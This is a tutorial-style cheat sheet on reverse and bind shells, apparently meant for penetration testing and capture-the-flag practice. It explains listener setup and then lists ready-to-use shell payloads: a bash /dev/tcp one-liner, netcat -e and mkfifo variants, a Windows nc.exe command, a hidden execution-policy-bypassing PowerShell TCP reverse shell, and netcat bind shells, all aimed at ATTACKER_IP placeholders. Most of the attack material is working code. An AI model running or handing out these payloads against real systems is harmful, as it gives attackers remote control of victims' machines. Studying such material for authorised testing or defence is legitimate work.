# Reverse Shell

## Description

A reverse shell is a type of shell where the target machine initiates a connection to the attacker's machine. This technique is commonly used in penetration testing and CTF challenges to gain remote access to a system.

# 🎯 Visualizing the Reverse Shell

🔹 Victim Machine (Target)
📌 What happens?

Executes a malicious command (e.g., Bash, Python, Netcat).
Connects to ATTACKER\_IP on ATTACKER\_PORT.
Opens a shell session and sends input/output to the attacker's machine.
🔹 Attacker Machine
📌 What happens?

Runs a Netcat listener or Metasploit handler.
Waits for a connection from the victim.
Once connected, the attacker can execute remote commands.

# How is This Different from a Bind Shell?

🔥 Reverse Shell ✅ Victim initiates connection to attacker.
✅ Useful when a firewall blocks incoming connections.

🔥 Bind Shell ✅ Victim opens a port, and the attacker connects to it.
❌ Blocked by firewalls if inbound connections aren’t allowed.

# 🎯 Attacker IP (Hacker's Machine)

What the Attacker Does
Listens for the Connection – The attacker starts a listener to wait for an incoming connection.
Receives the Shell – When the victim connects back, the attacker gains control of the shell.
Executes Commands Remotely – The attacker can now run commands on the victim's machine.
Attacker's Action in a Reverse Shell
Example (Attacker Runs This First):

```sh
nc -lvnp 4444
```

📌 What happens?

nc (Netcat) – A tool to create network connections.
-l – Listens for incoming connections.
-v – Verbose mode (shows connection details).
-n – Prevents DNS lookup (faster response).
-p 4444 – Listens on port 4444 for the victim to connect.

# 🎯 Victim IP (Target Machine)

What the Victim Does
Initiates the Connection – The victim sends an outbound request to the attacker's IP.
Creates a TCP Connection – The victim’s machine connects to the attacker's listening port.
Redirects Input/Output – The victim binds the shell (e.g., /bin/sh or cmd.exe) to the connection, allowing the attacker to send commands.
Victim's Action in a Reverse Shell
Example (Victim Runs This):

```sh
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
```

📌 What happens?

`/dev/tcp/ATTACKER_IP/ATTACKER_PORT` – Creates a TCP connection to the attacker.
`bash -i` – Opens an interactive shell.
`>&` – Redirects standard input/output/error to the attacker's machine.

# Step-by-Step Reverse Shell Execution

1️⃣ Attacker Prepares a Listener
(Runs on the Attacker's Machine)

```sh
nc -lvnp 4444
```

✅ Waiting for a connection...

2️⃣ Victim Executes the Reverse Shell
(Runs on the Victim's Machine)

```sh
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

✅ Victim connects back to the attacker.

3️⃣ Attacker Gets a Shell
✅ Connection established! Now the attacker can run commands on the victim's machine.

```sh
whoami
ls -la
uname -a
```

## Common Reverse Shells

# 🦾 Netcat (nc) Reverse Shell

```sh
nc -e /bin/sh ATTACKER_IP ATTACKER_PORT
```

📌 How it works:

Uses Netcat to send /bin/sh shell over a TCP connection to the attacker.
The -e flag executes a shell when a connection is received.
🔥 Alternative (if -e is disabled)

```sh
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT > /tmp/f
```

Creates a named pipe (mkfifo), allowing a shell session to be redirected.

# 🦀 Bash Reverse Shell

```sh
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
```

📌 How it works:

Uses /dev/tcp/ to create a network socket.
Redirects input/output to the attacker's machine.

# 🎯 Windows Reverse Shells

⚡ Windows Netcat (nc) Reverse Shell

```sh
nc.exe -e cmd.exe ATTACKER_IP ATTACKER_PORT
```

📌 How it works:

Uses Netcat (nc.exe) on Windows to connect back to the attacker's machine and execute cmd.exe.

# 🏹 PowerShell Reverse Shell

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object
System.Net.Sockets.TCPClient('ATTACKER_IP', ATTACKER_PORT);$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data =
(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data
2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

📌 How it works:

Uses PowerShell to create a TCP connection.
Reads data from the attacker and executes it like a remote shell

# 🎯 Bind Shells (Attacker Connects to Victim)

💀 Unlike a reverse shell, a bind shell opens a listener on the victim machine. The attacker connects to it.

🔥 Netcat Bind Shell (Linux)

```sh
nc -lvnp ATTACKER_PORT -e /bin/sh
```

🔥 Windows Bind Shell (Netcat)

```sh
nc.exe -lvnp ATTACKER_PORT -e cmd.exe
```

📌 How it works:

The victim starts a Netcat listener (-lvp).
The attacker connects to it.
